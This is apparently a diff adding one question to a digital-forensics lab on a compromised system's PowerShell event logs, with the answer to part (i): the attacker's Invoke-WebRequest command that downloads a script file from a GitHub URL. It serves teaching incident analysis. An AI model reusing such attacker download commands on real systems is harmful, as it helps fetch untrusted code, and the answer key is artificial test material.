@@ -1,0 +1,7 @@
+Q#3 : Given the PowerShell Event logs of a compromised system, answer the following:
+The event logs file can be downloaded from https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab 2/files/Microsoft-Windows-PowerShell%254Operational.evtx
+
+(i) What’s the command executed by the attacker to download a file on the system?
+Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"
+
+(ii) Can you analyze the downloaded file and understand what’s the purpose of that file?
